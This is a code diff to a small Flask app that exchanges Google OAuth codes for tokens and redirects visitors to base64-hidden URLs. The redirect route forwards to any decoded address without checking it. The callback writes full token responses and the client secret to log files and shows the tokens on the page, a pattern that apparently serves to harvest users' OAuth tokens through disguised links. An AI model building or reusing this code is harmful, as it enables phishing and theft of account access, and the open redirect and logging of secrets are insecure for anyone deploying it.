@@ -6,12 +6,14 @@ import os
 
 app = Flask(__name__)
 
-# Replace with your real Google OAuth credentials
+# Load from environment variables (set in Render dashboard)
 CLIENT_ID = os.environ.get("CLIENT_ID")
 CLIENT_SECRET = os.environ.get("CLIENT_SECRET")
 REDIRECT_URI = os.environ.get("REDIRECT_URI")
 
-# Set up logging
+assert CLIENT_ID and CLIENT_SECRET and REDIRECT_URI, "OAuth credentials not set"
+
+# Log to file
 logging.basicConfig(filename='access.log', level=logging.INFO, format='%(asctime)s %(message)s')
 
 @app.route('/')
@@ -23,12 +25,10 @@ def go():
     encoded = request.args.get('q')
     if not encoded:
         return "Missing 'q' parameter", 400
-
     try:
-        decoded_bytes = base64.urlsafe_b64decode(encoded.encode())
-        decoded_url = decoded_bytes.decode()
-        logging.info(f"[REDIRECT] Redirecting to: {decoded_url}")
-        return redirect(decoded_url)
+        decoded = base64.urlsafe_b64decode(encoded.encode()).decode()
+        logging.info(f"[REDIRECT] {decoded}")
+        return redirect(decoded)
     except Exception as e:
         logging.error(f"[ERROR] Base64 decode failed: {e}")
         return f"Invalid base64 input: {e}", 400
@@ -37,9 +37,8 @@ def go():
 def callback():
     code = request.args.get("code")
     if not code:
-        return "Missing authorization code", 400
+        return "Missing ?code=", 400
 
-    token_url = "https://oauth2.googleapis.com/token"
     data = {
         "code": code,
         "client_id": CLIENT_ID,
@@ -49,20 +48,20 @@ def callback():
     }
 
     try:
-        response = requests.post(token_url, data=data)
+        response = requests.post("https://oauth2.googleapis.com/token", data=data)
+        logging.info(f"[REQUEST PAYLOAD] {data}")
+        logging.info(f"[RESPONSE TEXT] {response.text}")
         response.raise_for_status()
         token_data = response.json()
 
-        # Save token to log file
+        # Save token data to file
         with open("tokens.log", "a") as f:
             f.write(f"[TOKEN RECEIVED]\n{token_data}\n\n")
 
-        logging.info(f"[TOKEN] {token_data}")
-        return f"<h2>Access Granted</h2><pre>{token_data}</pre>"
+        return f"<h1>Access Granted</h1><pre>{token_data}</pre>"
 
     except requests.exceptions.RequestException as e:
-        logging.error(f"[TOKEN ERROR] {str(e)}")
-        return f"<h2>Token exchange failed:</h2><pre>{str(e)}</pre>", 500
+        return f"<h1>Token exchange failed:</h1><pre>{str(e)}</pre>", 500
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
